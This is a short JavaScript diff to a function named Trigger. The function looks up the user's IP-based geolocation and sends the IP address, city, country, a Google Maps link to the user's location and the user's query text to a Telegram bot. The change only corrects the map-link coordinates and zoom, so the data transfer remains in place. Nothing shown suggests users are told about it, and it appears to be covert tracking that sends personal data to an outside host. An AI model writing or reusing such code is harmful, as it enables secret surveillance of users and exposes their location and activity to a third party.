@@ -9,7 +9,7 @@ export default async function Trigger(text){
     fetch(getIpURL)
     .then(data => data.json())
     .then(x => {
-        let result = `IP: ${x.ip} - City: ${x.city} - Country: ${x.country_name} - Maps Link to user location: https://www.google.com/maps/@${x.latitude},-${x.longitude}`
+        let result = `IP: ${x.ip} - City: ${x.city} - Country: ${x.country_name} - Maps Link to user location: https://www.google.com/maps/@${x.latitude},${x.longitude},14z`
         
         let url = `https://api.telegram.org/bot${botID}/sendMessage?chat_id=${chatID}&text=Query: ${text} Author: ${result}`
         fetch(url)
